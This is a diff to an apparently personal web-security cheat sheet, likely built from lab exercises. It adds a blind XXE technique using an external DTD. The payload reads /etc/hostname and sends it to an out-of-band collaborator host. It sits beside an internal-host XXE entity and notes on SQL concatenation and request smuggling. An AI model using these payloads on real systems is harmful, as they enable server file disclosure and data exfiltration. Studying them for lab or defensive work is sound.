@@ -142,6 +142,19 @@ Mysql `CONCAT('foo','bar')` or `'foo' 'bar'` note space.
 
 `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
 
+### by external dtd
+
+`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aa800a30441eeb8b8d95f79014c003f.exploit-server.net/malicious.dtd"> %xxe;]>`
+
+On server
+
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://tvshzpfsrtbjnwnzfbxijlb3yu4lsfg4.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
 
 # HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
 It uses 2 headers. `Content-Length: x` and `Transfer-Encoding: chunked`. **It works only in HTTTP/1.1**.
